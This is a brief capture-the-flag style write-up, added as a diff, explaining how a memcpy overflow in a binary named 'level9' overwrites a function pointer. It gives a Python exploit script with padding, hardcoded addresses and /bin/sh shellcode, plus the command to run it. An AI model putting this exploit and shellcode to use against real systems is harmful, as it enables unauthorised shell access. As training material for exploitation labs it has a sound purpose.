@@ -1,0 +1,20 @@
+We can see a memcpy call on the first object. It will copy argv[1] on itself. From here, we can override the first object.
+Then a function call appear on a function pointer. Since there are two dereference operator to execute the call, we need to preced our shellcode with two addresses that points to the begining of our shellcode. So the function call executes our shellcode.
+
+```python
+#! /usr/bin/env python
+
+OFFSET = "A" * 108
+
+ADDR = "\x7c\xa0\x04\x08"
+
+ADDR1 = "\x80\xa0\04\x08"
+
+SHELLCODE = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+CONTENT = OFFSET + ADDR + ADDR1 + SHELLCODE
+
+print(CONTENT)
+```
+
+./level9 $(python exploit.py)
